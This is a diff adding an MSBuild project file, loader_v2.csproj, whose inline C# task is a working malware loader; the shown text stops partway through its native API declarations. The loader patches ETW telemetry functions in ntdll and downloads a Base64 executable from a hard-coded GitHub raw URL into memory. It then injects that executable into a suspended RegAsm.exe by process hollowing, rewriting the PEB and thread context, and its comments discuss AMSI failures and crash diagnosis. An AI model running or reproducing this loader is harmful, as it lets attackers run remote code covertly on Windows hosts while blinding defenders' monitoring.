@@ -1,0 +1,850 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  loader_v2.csproj - MSBuild inline-task loader (RDP-safe build)
+  ============================================================================
+  Run:
+      C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe loader_v2.csproj
+
+  Changes vs loader.csproj:
+    - child-side ETW patching is OFF by default (CHILD_ETW=1 re-enables it).
+      The x86 stdcall cleanup for EtwEventWrite is build-sensitive: the same
+      bytes need ret 0x14 here but a different count on other Windows builds,
+      and the wrong count corrupts the CLR thread's stack right after init -
+      which is what kills RegAsm on the RDP host.
+    - liveness window is 5 s (LIVENESS_MS overrides) and the child's exit code
+      is logged and interpreted, so a remaining crash names itself.
+
+  The payload is the Base64 of a 32-bit .NET executable. It is downloaded from
+  PayloadUrl straight into memory at run time; no payload file is read from or
+  written to disk at any point. Set PAYLOAD_URL to override the URL.
+
+  Chain, in order:
+      1. patch local ntdll!EtwEventWrite / EtwEventWriteTransfer in MSBuild
+      2. download + base64-decode the payload in memory
+      3. CreateProcess(RegAsm.exe, CREATE_SUSPENDED)
+      4. VirtualAllocEx elsewhere (preferred base, then anywhere) - the original
+         image is left mapped and untouched
+      5. build headers + sections, apply relocations, resolve imports by hand
+      6. WriteProcessMemory the resolved image, set section protections
+      7. patch PEB.ImageBaseAddress -> new base
+      8. SetThreadContext.Eip = newBase + AddressOfEntryPoint
+      9. ResumeThread, then watch the child's exit code
+
+  The image is fully resolved before it lands: relocations are applied against
+  the real allocation base and the IAT is filled with live addresses, so the
+  payload is position-independent by the time the thread starts on it.
+
+  Everything is P/Invoke + Marshal; CodeTaskFactory compiles without /unsafe,
+  so there is not a single unsafe block in here.
+-->
+<Project ToolsVersion="4.0" DefaultTargets="Go"
+         xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+
+  <UsingTask TaskName="LoaderTask" TaskFactory="CodeTaskFactory"
+             AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Method" Language="cs"><![CDATA[
+
+// ===========================================================================
+//  entry
+// ===========================================================================
+public override bool Execute()
+{
+    try
+    {
+        if (System.IntPtr.Size != 4)
+        {
+            Log.LogError("[!] this host is not 32-bit - run Framework\\v4.0.30319\\MSBuild.exe (not Framework64)");
+            return false;
+        }
+
+        Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High,
+            "[*] loader up: " + System.AppDomain.CurrentDomain.FriendlyName + " (32-bit)");
+
+        int etwLocal = PatchEtwLocal();
+        Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High,
+            "[*] local ETW user-mode providers patched: " + etwLocal);
+
+        byte[] image = LoadPayload();
+        if (image == null) return false;
+
+        Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High,
+            "[*] payload decoded in memory: " + image.Length + " bytes");
+
+        return Hollow(image);
+    }
+    catch (System.Exception ex)
+    {
+        Log.LogError("[!] " + ex.GetType().Name + ": " + ex.Message);
+        Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High, ex.StackTrace);
+        return false;
+    }
+}
+
+// ===========================================================================
+//  payload: download the blob, decode it in memory
+// ===========================================================================
+const string PayloadUrl = "https://github.com/i25968627-ui/bookish-engine/raw/refs/heads/main/payload.txt";
+
+byte[] LoadPayload()
+{
+    string url = System.Environment.GetEnvironmentVariable("PAYLOAD_URL");
+    if (string.IsNullOrEmpty(url)) url = PayloadUrl;
+
+    string text;
+
+    try
+    {
+        System.Net.ServicePointManager.SecurityProtocol = (System.Net.SecurityProtocolType)3072; // TLS 1.2
+
+        using (System.Net.WebClient client = new System.Net.WebClient())
+        {
+            client.Headers.Add("User-Agent", "Mozilla/5.0");
+            client.Headers.Add("Accept", "text/plain,*/*");
+            text = client.DownloadString(url);
+        }
+
+        Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High,
+            "[*] payload downloaded to memory: " + text.Length + " chars from " + url);
+    }
+    catch (System.Exception ex)
+    {
+        Log.LogError("[!] payload download failed: " + ex.GetType().Name + ": " + ex.Message);
+        return null;
+    }
+
+    try
+    {
+        // Convert.FromBase64String tolerates CR/LF/space wrapping
+        return System.Convert.FromBase64String(text);
+    }
+    catch (System.FormatException)
+    {
+        Log.LogError("[!] payload blob is not valid Base64");
+        return null;
+    }
+}
+
+// ===========================================================================
+//  hollowing
+// ===========================================================================
+bool Hollow(byte[] image)
+{
+    if (image.Length < 0x100)
+    {
+        Log.LogError("[!] payload truncated");
+        return false;
+    }
+
+    int peOff = System.BitConverter.ToInt32(image, 0x3C);
+    if (peOff <= 0 || peOff + 0x100 > image.Length)
+    {
+        Log.LogError("[!] bad e_lfanew");
+        return false;
+    }
+    if (System.BitConverter.ToUInt32(image, peOff) != 0x00004550)
+    {
+        Log.LogError("[!] missing PE signature");
+        return false;
+    }
+
+    ushort machine = System.BitConverter.ToUInt16(image, peOff + 4);
+    ushort numSections = System.BitConverter.ToUInt16(image, peOff + 6);
+    ushort optSize = System.BitConverter.ToUInt16(image, peOff + 20);
+    int opt = peOff + 24;
+    ushort magic = System.BitConverter.ToUInt16(image, opt);
+
+    if (magic != 0x010B)
+    {
+        Log.LogError("[!] payload is not PE32 (PE32+ / 64-bit)");
+        return false;
+    }
+    if (machine != 0x014C)
+    {
+        Log.LogError("[!] payload machine is 0x" + machine.ToString("X4") + ", expected i386");
+        return false;
+    }
+    if (opt + 96 + 15 * 8 > image.Length)
+    {
+        Log.LogError("[!] optional header truncated");
+        return false;
+    }
+
+    uint entry = System.BitConverter.ToUInt32(image, opt + 16);
+    uint prefBase = System.BitConverter.ToUInt32(image, opt + 28);
+    uint sizeOfImage = System.BitConverter.ToUInt32(image, opt + 56);
+    uint sizeOfHeaders = System.BitConverter.ToUInt32(image, opt + 60);
+    uint clrRva = System.BitConverter.ToUInt32(image, opt + 96 + 14 * 8);
+    int secTable = opt + optSize;
+
+    if (sizeOfImage == 0 || sizeOfImage > 0x20000000 || sizeOfHeaders > sizeOfImage)
+    {
+        Log.LogError("[!] implausible SizeOfImage / SizeOfHeaders");
+        return false;
+    }
+    if (secTable + numSections * 40 > image.Length)
+    {
+        Log.LogError("[!] section table truncated");
+        return false;
+    }
+
+    Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High, string.Format(
+        "[*] PE32 prefBase=0x{0:X8} entry=0x{1:X8} image=0x{2:X} sections={3} clr={4}",
+        prefBase, entry, sizeOfImage, numSections, clrRva != 0));
+
+    string regasm = System.IO.Path.Combine(
+        System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe");
+    if (!System.IO.File.Exists(regasm))
+    {
+        Log.LogError("[!] host missing: " + regasm);
+        return false;
+    }
+
+    STARTUPINFO si = new STARTUPINFO();
+    si.cb = System.Runtime.InteropServices.Marshal.SizeOf(typeof(STARTUPINFO));
+
+    PROCESS_INFORMATION pi;
+    System.Text.StringBuilder cmdLine = new System.Text.StringBuilder("\"" + regasm + "\"");
+    const uint CREATE_SUSPENDED = 0x00000004;
+    const uint CREATE_NO_WINDOW = 0x08000000;
+
+    if (!Native.CreateProcessW(null, cmdLine, System.IntPtr.Zero, System.IntPtr.Zero, false,
+            CREATE_SUSPENDED | CREATE_NO_WINDOW, System.IntPtr.Zero,
+            System.IO.Path.GetDirectoryName(regasm), ref si, out pi))
+    {
+        Log.LogError("[!] CreateProcessW failed: " + System.Runtime.InteropServices.Marshal.GetLastWin32Error());
+        return false;
+    }
+
+    Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High,
+        "[*] RegAsm.exe suspended, pid " + pi.dwProcessId);
+
+    try
+    {
+        // --- PEB + original base -------------------------------------------
+        PROCESS_BASIC_INFORMATION pbi;
+        int retLen;
+        int status = Native.NtQueryInformationProcess(pi.hProcess, 0, out pbi,
+            System.Runtime.InteropServices.Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out retLen);
+        if (status != 0)
+            throw new System.Exception("NtQueryInformationProcess 0x" + status.ToString("X8"));
+
+        System.IntPtr peb = pbi.PebBaseAddress;
+        System.IntPtr origBase = ReadPtr(pi.hProcess, Add(peb, 8));
+        Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High, string.Format(
+            "[*] peb=0x{0:X8} originalBase=0x{1:X8}", peb.ToInt32(), origBase.ToInt32()));
+
+        // --- allocate a fresh chunk; original image stays mapped -----------
+        Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High, string.Format(
+            "[*] original image stays mapped at 0x{0:X8}", origBase.ToInt32()));
+
+        System.IntPtr remoteBase = Native.VirtualAllocEx(pi.hProcess,
+            new System.IntPtr(unchecked((int)prefBase)), Sz((int)sizeOfImage), 0x3000, 0x04);
+        if (remoteBase == System.IntPtr.Zero)
+            remoteBase = Native.VirtualAllocEx(pi.hProcess, System.IntPtr.Zero,
+                Sz((int)sizeOfImage), 0x3000, 0x04);
+        if (remoteBase == System.IntPtr.Zero)
+            throw new System.Exception("VirtualAllocEx failed: " + System.Runtime.InteropServices.Marshal.GetLastWin32Error());
+
+        Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High,
+            string.Format("[*] payload mapped at 0x{0:X8}", remoteBase.ToInt32()));
+
+        // --- build the image in managed memory ------------------------------
+        byte[] mapped = BuildImage(image, opt, secTable, numSections, sizeOfHeaders, sizeOfImage, prefBase, remoteBase);
+
+        System.UIntPtr written;
+        if (!Native.WriteProcessMemory(pi.hProcess, remoteBase, mapped, Sz(mapped.Length), out written))
+            throw new System.Exception("WriteProcessMemory(image) failed: " + System.Runtime.InteropServices.Marshal.GetLastWin32Error());
+
+        ProtectSections(pi.hProcess, remoteBase, mapped, secTable, numSections, sizeOfHeaders);
+
+        // --- child telemetry (v2: opt-in) -----------------------------------
+        // The ret-imm16 cleanup below is build-sensitive. On this toolchain
+        // EtwEventWrite needs 0x14, but another Windows build can use a different
+        // count; a wrong count corrupts the CLR thread's stack and kills the host
+        // a moment after init. Off unless CHILD_ETW=1.
+        bool etwOn = System.Environment.GetEnvironmentVariable("CHILD_ETW") == "1";
+        bool etw1 = false;
+        bool etw2 = false;
+
+        if (etwOn)
+        {
+            byte[] etwWrite     = new byte[] { 0x33, 0xC0, 0xC2, 0x14, 0x00 }; // xor eax,eax; ret 0x14
+            byte[] etwTransfer  = new byte[] { 0x33, 0xC0, 0xC2, 0x18, 0x00 }; // xor eax,eax; ret 0x18
+            etw1 = PatchRemoteExport(pi.hProcess, "ntdll.dll", "EtwEventWrite", etwWrite);
+            etw2 = PatchRemoteExport(pi.hProcess, "ntdll.dll", "EtwEventWriteTransfer", etwTransfer);
+        }
+
+        Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High,
+            "[*] child ETW patch: " + (etwOn ? (etw1 || etw2).ToString() : "skipped (v2 default, CHILD_ETW=1 forces)"));
+
+        // --- PEB image base -------------------------------------------------
+        if (remoteBase != origBase)
+        {
+            if (!WriteRemote(pi.hProcess, Add(peb, 8), System.BitConverter.GetBytes(remoteBase.ToInt32())))
+                Log.LogWarning("[!] PEB.ImageBaseAddress patch failed");
+        }
+
+        // --- thread context -------------------------------------------------
+        System.IntPtr ctx = Native.VirtualAlloc(System.IntPtr.Zero, Sz(0x400), 0x3000, 0x04);
+        if (ctx == System.IntPtr.Zero)
+            throw new System.Exception("context alloc failed: " + System.Runtime.InteropServices.Marshal.GetLastWin32Error());
+
+        try
+        {
+            System.Runtime.InteropServices.Marshal.WriteInt32(ctx, 0, 0x0001001F); // CONTEXT_ALL_386
+            if (!Native.GetThreadContext(pi.hThread, ctx))
+                throw new System.Exception("GetThreadContext failed: " + System.Runtime.InteropServices.Marshal.GetLastWin32Error());
+
+            // x86 CONTEXT: Eip lives at offset 184
+            System.Runtime.InteropServices.Marshal.WriteInt32(ctx, 184,
+                remoteBase.ToInt32() + unchecked((int)entry));
+
+            if (!Native.SetThreadContext(pi.hThread, ctx))
+                throw new System.Exception("SetThreadContext failed: " + System.Runtime.InteropServices.Marshal.GetLastWin32Error());
+        }
+        finally
+        {
+            Native.VirtualFree(ctx, System.UIntPtr.Zero, 0x8000);
+        }
+
+        // --- go ---------------------------------------------------------------
+        uint resume = Native.ResumeThread(pi.hThread);
+        if (resume == 0xFFFFFFFF)
+            throw new System.Exception("ResumeThread failed: " + System.Runtime.InteropServices.Marshal.GetLastWin32Error());
+
+        Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High, string.Format(
+            "[*] resumed at 0x{0:X8} -> managed entry should follow the CLR shim",
+            remoteBase.ToInt32() + unchecked((int)entry)));
+
+        // --- liveness + crash diagnosis ---------------------------------------
+        // v2 waits longer and names the exit code: a crash right after init is
+        // usually AMSI/CLR failing to load the assembly, a stack-cookie failure,
+        // or an access violation - each has a distinct code.
+        int waitMs = 5000;
+        string waitEnv = System.Environment.GetEnvironmentVariable("LIVENESS_MS");
+        if (!string.IsNullOrEmpty(waitEnv))
+        {
+            int parsed;
+            if (int.TryParse(waitEnv, out parsed) && parsed >= 0) waitMs = parsed;
+        }
+
+        Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High,
+            "[*] watching child for " + waitMs + " ms");
+
+        if (Native.WaitForSingleObject(pi.hProcess, (uint)waitMs) == 0)
+        {
+            uint code;
+            Native.GetExitCodeProcess(pi.hProcess, out code);
+
+            string why;
+            if (code == 0) why = "clean exit";
+            else if (code == 0xE0434352) why = "unhandled .NET exception (often CLR/AMSI refusing the assembly)";
+            else if (code == 0xC0000409) why = "stack-cookie / fail-fast (calling-convention corruption)";
+            else if (code == 0xC0000005) why = "access violation";
+            else if (code == 0xC0000135) why = "missing DLL / unresolved import";
+            else if (code == 0xC0000142) why = "DLL initialization failed";
+            else if (code == 0x80131506) why = "CLR execution-engine failure";
+            else why = "unclassified";
+
+            Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High,
+                string.Format("[*] child exited, code 0x{0:X8} - {1}", code, why));
+
+            if (code != 0) throw new System.Exception("payload died after injection: " + why);
+        }
+        else
+        {
+            Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High,
+                "[*] payload alive after " + waitMs + " ms");
+        }
+
+        return true;
+    }
+    catch (System.Exception ex)
+    {
+        Log.LogError("[!] " + ex.Message);
+        Native.TerminateProcess(pi.hProcess, 1);
+        return false;
+    }
+    finally
+    {
+        Native.CloseHandle(pi.hThread);
+        Native.CloseHandle(pi.hProcess);
+    }
+}
+
+// ===========================================================================
+//  image construction
+// ===========================================================================
+byte[] BuildImage(byte[] image, int opt, int secTable, int numSections,
+    uint sizeOfHeaders, uint sizeOfImage, uint prefBase, System.IntPtr remoteBase)
+{
+    byte[] mapped = new byte[unchecked((int)sizeOfImage)];
+
+    int headers = (int)System.Math.Min(sizeOfHeaders, (uint)image.Length);
+    System.Buffer.BlockCopy(image, 0, mapped, 0, headers);
+
+    // the OS loader uses PE header ImageBase; keep it honest after a rebase
+    System.Buffer.BlockCopy(System.BitConverter.GetBytes(remoteBase.ToInt32()), 0, mapped, opt + 28, 4);
+
+    for (int i = 0; i < numSections; i++)
+    {
+        int s = secTable + i * 40;
+        uint va = System.BitConverter.ToUInt32(image, s + 12);
+        uint rawSize = System.BitConverter.ToUInt32(image, s + 16);
+        uint rawPtr = System.BitConverter.ToUInt32(image, s + 20);
+
+        if (rawSize == 0 || rawPtr == 0) continue;
+        if (va >= mapped.Length) continue;
+
+        int copy = (int)System.Math.Min(rawSize, (uint)(mapped.Length - (int)va));
+        if ((long)rawPtr + copy > image.Length) copy = image.Length - (int)rawPtr;
+        if (copy <= 0) continue;
+
+        System.Buffer.BlockCopy(image, (int)rawPtr, mapped, (int)va, copy);
+    }
+
+    long delta = remoteBase.ToInt64() - prefBase;
+    if (delta != 0)
+    {
+        uint relocRva = System.BitConverter.ToUInt32(image, opt + 96 + 5 * 8);
+        uint relocSize = System.BitConverter.ToUInt32(image, opt + 96 + 5 * 8 + 4);
+
+        if (relocRva != 0 && relocSize != 0)
+        {
+            ApplyRelocations(mapped, relocRva, relocSize, unchecked((int)delta));
+            Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High,
+                string.Format("[*] relocations applied, delta 0x{0:X}", unchecked((int)delta)));
+        }
+        else
+        {
+            Log.LogWarning("[!] image rebased with stripped relocs - fine for IL-only, not for mixed-mode");
+        }
+    }
+
+    uint importRva = System.BitConverter.ToUInt32(image, opt + 96 + 8);
+    ResolveImports(mapped, importRva);
+
+    return mapped;
+}
+
+void ApplyRelocations(byte[] mapped, uint relocRva, uint relocSize, int delta)
+{
+    int p = unchecked((int)relocRva);
+    int end = p + unchecked((int)relocSize);
+    if (end > mapped.Length) end = mapped.Length;
+
+    while (p + 8 <= end)
+    {
+        uint pageRva = System.BitConverter.ToUInt32(mapped, p);
+        uint blockSize = System.BitConverter.ToUInt32(mapped, p + 4);
+        if (blockSize < 8 || p + unchecked((int)blockSize) > end) break;
+
+        int entries = (int)((blockSize - 8) / 2);
+        for (int i = 0; i < entries; i++)
+        {
+            ushort entry = System.BitConverter.ToUInt16(mapped, p + 8 + i * 2);
+            int type = entry >> 12;
+            int offset = entry & 0x0FFF;
+            int target = unchecked((int)pageRva) + offset;
+
+            if (type == 3 && target + 4 <= mapped.Length)          // HIGHLOW
+            {
+                uint v = System.BitConverter.ToUInt32(mapped, target);
+                byte[] b = System.BitConverter.GetBytes(unchecked(v + (uint)delta));
+                System.Buffer.BlockCopy(b, 0, mapped, target, 4);
+            }
+            else if (type == 10 && target + 8 <= mapped.Length)     // DIR64
+            {
+                ulong v = System.BitConverter.ToUInt64(mapped, target);
+                byte[] b = System.BitConverter.GetBytes(unchecked(v + (ulong)delta));
+                System.Buffer.BlockCopy(b, 0, mapped, target, 8);
+            }
+        }
+
+        p += unchecked((int)blockSize);
+    }
+}
+
+void ResolveImports(byte[] mapped, uint importRva)
+{
+    if (importRva == 0) return;
+
+    int desc = unchecked((int)importRva);
+    int guard = 0;
+
+    while (guard++ < 512)
+    {
+        uint nameRva = System.BitConverter.ToUInt32(mapped, desc + 12);
+        uint firstThunk = System.BitConverter.ToUInt32(mapped, desc + 16);
+        uint oft = System.BitConverter.ToUInt32(mapped, desc + 0);
+
+        if (nameRva == 0 || firstThunk == 0) break;
+
+        string dll = ReadAnsi(mapped, unchecked((int)nameRva));
+        System.IntPtr mod = Native.LoadLibraryA(dll);
+
+        if (mod == System.IntPtr.Zero)
+        {
+            Log.LogWarning("[!] import module failed to load: " + dll);
+            desc += 20;
+            continue;
+        }
+
+        int thunkRva = unchecked((int)(oft != 0 ? oft : firstThunk));
+        int slot = unchecked((int)firstThunk);
+        int i = 0;
+
+        while (i < 4096)
+        {
+            uint thunk = System.BitConverter.ToUInt32(mapped, thunkRva + i * 4);
+            if (thunk == 0) break;
+
+            System.IntPtr fn;
+            string label;
+
+            if ((thunk & 0x80000000u) != 0)
+            {
+                label = "#" + (thunk & 0xFFFF);
+                fn = Native.GetProcAddress(mod, new System.IntPtr(unchecked((int)(thunk & 0xFFFF))));
+            }
+            else
+            {
+                label = ReadAnsi(mapped, unchecked((int)(thunk + 2)));
+                fn = Native.GetProcAddress(mod, label);
+            }
+
+            if (fn == System.IntPtr.Zero)
+                Log.LogWarning("[!] unresolved import " + dll + "!" + label);
+
+            System.Buffer.BlockCopy(System.BitConverter.GetBytes(fn.ToInt32()), 0, mapped, slot + i * 4, 4);
+            i++;
+        }
+
+        desc += 20;
+    }
+}
+
+void ProtectSections(System.IntPtr hProc, System.IntPtr baseAddr, byte[] mapped,
+    int secTable, int numSections, uint sizeOfHeaders)
+{
+    uint old;
+    Native.VirtualProtectEx(hProc, baseAddr, Sz((int)sizeOfHeaders), 0x02, out old);
+
+    for (int i = 0; i < numSections; i++)
+    {
+        int s = secTable + i * 40;
+        uint vsize = System.BitConverter.ToUInt32(mapped, s + 8);
+        uint va = System.BitConverter.ToUInt32(mapped, s + 12);
+        uint rawSize = System.BitConverter.ToUInt32(mapped, s + 16);
+        uint chars = System.BitConverter.ToUInt32(mapped, s + 36);
+
+        uint size = System.Math.Max(vsize, rawSize);
+        if (size == 0) continue;
+
+        bool exec = (chars & 0x20000000) != 0;
+        bool write = (chars & 0x80000000) != 0;
+
+        uint prot;
+        if (exec && write) prot = 0x40;      // PAGE_EXECUTE_READWRITE
+        else if (exec) prot = 0x20;          // PAGE_EXECUTE_READ
+        else if (write) prot = 0x04;         // PAGE_READWRITE
+        else prot = 0x02;                    // PAGE_READONLY
+
+        uint ignored;
+        if (!Native.VirtualProtectEx(hProc, Add(baseAddr, unchecked((int)va)), Sz((int)size), prot, out ignored))
+            Log.LogWarning("[!] protect failed on section " + i);
+    }
+}
+
+// ===========================================================================
+//  etw
+// ===========================================================================
+int PatchEtwLocal()
+{
+    int n = 0;
+    if (PatchLocalExport("ntdll.dll", "EtwEventWrite",
+            new byte[] { 0x33, 0xC0, 0xC2, 0x14, 0x00 })) n++;
+    if (PatchLocalExport("ntdll.dll", "EtwEventWriteTransfer",
+            new byte[] { 0x33, 0xC0, 0xC2, 0x18, 0x00 })) n++;
+    return n;
+}
+
+bool PatchLocalExport(string module, string func, byte[] patch)
+{
+    System.IntPtr mod = Native.GetModuleHandleW(module);
+    if (mod == System.IntPtr.Zero) return false;
+
+    System.IntPtr fn = Native.GetProcAddress(mod, func);
+    if (fn == System.IntPtr.Zero) return false;
+
+    uint oldProtect;
+    if (!Native.VirtualProtect(fn, Sz(patch.Length), 0x40, out oldProtect)) return false;
+
+    System.Runtime.InteropServices.Marshal.Copy(patch, 0, fn, patch.Length);
+
+    uint ignored;
+    Native.VirtualProtect(fn, Sz(patch.Length), oldProtect, out ignored);
+    return true;
+}
+
+bool PatchRemoteExport(System.IntPtr hProc, string module, string func, byte[] patch)
+{
+    System.IntPtr localMod = Native.LoadLibraryA(module);
+    if (localMod == System.IntPtr.Zero)
+    {
+        Log.LogWarning("[!] could not load " + module + " locally");
+        return false;
+    }
+
+    System.IntPtr localFn = Native.GetProcAddress(localMod, func);
+    if (localFn == System.IntPtr.Zero)
+    {
+        Log.LogWarning("[!] export missing: " + module + "!" + func);
+        return false;
+    }
+
+    int rva = localFn.ToInt32() - localMod.ToInt32();
+
+    System.IntPtr remoteMod = FindRemoteModule(hProc, module);
+
+    System.IntPtr remoteFn = remoteMod == System.IntPtr.Zero
+        ? localFn                                  // system images share one base per boot
+        : new System.IntPtr(remoteMod.ToInt32() + rva);
+
+    bool ok = WriteRemote(hProc, remoteFn, patch);
+    Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High, string.Format(
+        "[*] {0}!{1} @0x{2:X8} patch {3}", module, func, remoteFn.ToInt32(), ok ? "ok" : "FAILED"));
+    return ok;
+}
+
+bool WriteRemote(System.IntPtr hProc, System.IntPtr addr, byte[] data)
+{
+    uint oldProtect;
+    if (!Native.VirtualProtectEx(hProc, addr, Sz(data.Length), 0x04, out oldProtect))
+        return false;
+
+    System.UIntPtr written;
+    bool ok = Native.WriteProcessMemory(hProc, addr, data, Sz(data.Length), out written);
+
+    uint ignored;
+    Native.VirtualProtectEx(hProc, addr, Sz(data.Length), oldProtect, out ignored);
+    return ok;
+}
+
+// ===========================================================================
+//  remote memory helpers (32-bit)
+// ===========================================================================
+System.IntPtr FindRemoteModule(System.IntPtr hProc, string name)
+{
+    try
+    {
+        PROCESS_BASIC_INFORMATION pbi;
+        int retLen;
+        if (Native.NtQueryInformationProcess(hProc, 0, out pbi,
+                System.Runtime.InteropServices.Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out retLen) != 0)
+            return System.IntPtr.Zero;
+
+        System.IntPtr ldr = ReadPtr(hProc, Add(pbi.PebBaseAddress, 0x0C));
+        if (ldr == System.IntPtr.Zero) return System.IntPtr.Zero;
+
+        System.IntPtr head = Add(ldr, 0x0C);
+        System.IntPtr cur = ReadPtr(hProc, head);
+        int guard = 0;
+
+        while (cur != System.IntPtr.Zero && cur != head && guard++ < 256)
+        {
+            System.IntPtr dllBase = ReadPtr(hProc, Add(cur, 0x18));
+            int len = ReadInt16(hProc, Add(cur, 0x2C));
+            System.IntPtr buf = ReadPtr(hProc, Add(cur, 0x30));
+            string n = ReadUnicode(hProc, buf, len);
+
+            if (n != null && string.Equals(n, name, System.StringComparison.OrdinalIgnoreCase))
+                return dllBase;
+
+            cur = ReadPtr(hProc, cur);
+        }
+    }
+    catch (System.Exception) { }
+
+    return System.IntPtr.Zero;
+}
+
+System.IntPtr ReadPtr(System.IntPtr hProc, System.IntPtr addr)
+{
+    byte[] buf = new byte[4];
+    System.UIntPtr read;
+    if (!Native.ReadProcessMemory(hProc, addr, buf, Sz(4), out read)) return System.IntPtr.Zero;
+    return new System.IntPtr(System.BitConverter.ToInt32(buf, 0));
+}
+
+int ReadInt16(System.IntPtr hProc, System.IntPtr addr)
+{
+    byte[] buf = new byte[2];
+    System.UIntPtr read;
+    if (!Native.ReadProcessMemory(hProc, addr, buf, Sz(2), out read)) return 0;
+    return System.BitConverter.ToInt16(buf, 0);
+}
+
+string ReadUnicode(System.IntPtr hProc, System.IntPtr addr, int byteLen)
+{
+    if (byteLen <= 0 || byteLen > 256) return null;
+
+    byte[] buf = new byte[byteLen];
+    System.UIntPtr read;
+    if (!Native.ReadProcessMemory(hProc, addr, buf, Sz(byteLen), out read)) return null;
+
+    return System.Text.Encoding.Unicode.GetString(buf);
+}
+
+string ReadAnsi(byte[] map, int offset)
+{
+    if (offset < 0 || offset >= map.Length) return string.Empty;
+
+    int end = offset;
+    while (end < map.Length && map[end] != 0) end++;
+
+    return System.Text.Encoding.ASCII.GetString(map, offset, end - offset);
+}
+
+static System.IntPtr Add(System.IntPtr p, int offset)
+{
+    if (System.IntPtr.Size == 4) return new System.IntPtr(p.ToInt32() + offset);
+    return new System.IntPtr(p.ToInt64() + offset);
+}
+
+static System.UIntPtr Sz(int n)
+{
+    return (System.UIntPtr)unchecked((uint)n);
+}
+
+// ===========================================================================
+//  native
+// ===========================================================================
+static class Native
+{
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode, SetLastError = true)]
+    public static extern bool CreateProcessW(string lpApplicationName, System.Text.StringBuilder lpCommandLine,
+        System.IntPtr lpProcessAttributes, System.IntPtr lpThreadAttributes, bool bInheritHandles,
+        uint dwCreationFlags, System.IntPtr lpEnvironment, string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint ResumeThread(System.IntPtr hThread);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(System.IntPtr hObject);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool TerminateProcess(System.IntPtr hProcess, uint uExitCode);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool GetExitCodeProcess(System.IntPtr hProcess, out uint lpExitCode);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern System.IntPtr VirtualAllocEx(System.IntPtr hProcess, System.IntPtr lpAddress,
+        System.UIntPtr dwSize, uint flAllocationType, uint flProtect);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualProtectEx(System.IntPtr hProcess, System.IntPtr lpAddress,
+        System.UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool WriteProcessMemory(System.IntPtr hProcess, System.IntPtr lpBaseAddress,
+        byte[] lpBuffer, System.UIntPtr nSize, out System.UIntPtr lpNumberOfBytesWritten);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool ReadProcessMemory(System.IntPtr hProcess, System.IntPtr lpBaseAddress,
+        byte[] lpBuffer, System.UIntPtr nSize, out System.UIntPtr lpNumberOfBytesRead);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern System.IntPtr VirtualAlloc(System.IntPtr lpAddress, System.UIntPtr dwSize,
+        uint flAllocationType, uint flProtect);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualFree(System.IntPtr lpAddress, System.UIntPtr dwSize, uint dwFreeType);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualProtect(System.IntPtr lpAddress, System.UIntPtr dwSize,
+        uint flNewProtect, out uint lpflOldProtect);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode, SetLastError = true)]
+    public static extern System.IntPtr GetModuleHandleW(string lpModuleName);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Ansi, SetLastError = true)]
+    public static extern System.IntPtr LoadLibraryA(string lpFileName);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Ansi, SetLastError = true)]
+    public static extern System.IntPtr GetProcAddress(System.IntPtr hModule, string lpProcName);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Ansi, SetLastError = true)]
+    public static extern System.IntPtr GetProcAddress(System.IntPtr hModule, System.IntPtr lpProcName);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint WaitForSingleObject(System.IntPtr hHandle, uint dwMilliseconds);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
